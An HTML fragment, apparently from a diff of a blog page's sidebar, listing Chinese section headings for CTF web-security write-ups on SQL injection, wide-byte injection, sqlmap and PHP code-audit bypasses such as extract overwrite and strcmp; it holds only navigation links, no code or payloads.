href="#3-获取列名"><span class="nav-number">1.3.3.</span> <span class="nav-text">3.获取列名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-获取flag"><span class="nav-number">1.3.4.</span> <span class="nav-text">4.获取flag</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#备份是个好习惯"><span class="nav-number">1.4.</span> <span class="nav-text">备份是个好习惯</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#多次"><span class="nav-number">1.5.</span> <span class="nav-text">多次</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#宽字节注入"><span class="nav-number">1.6.</span> <span class="nav-text">宽字节注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#一、手工注入"><span class="nav-number">1.6.1.</span> <span class="nav-text">一、手工注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#二、sqlmap注入"><span class="nav-number">1.6.2.</span> <span class="nav-text">二、sqlmap注入</span></a></li></ol></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#简单的代码审计"><span class="nav-number">1.</span> <span class="nav-text">简单的代码审计</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#extract变量覆盖"><span class="nav-number">1.1.</span> <span class="nav-text">extract变量覆盖</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#strcmp比较字符串"><span class="nav-number">1.2.</span> <span class="nav-text">strcmp比较字符串</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#urldecode二次编码绕过"><span class="nav-number">1.3.</span> <span class="nav-text">urldecode二次编码绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#md5-函数"><span class="nav-number">1.4.</span> <span class="nav-text">md5()函数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#数组返回NULL绕过"><span class="nav-number">1.5.</span> <span class="nav-text">数组返回NULL绕过</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
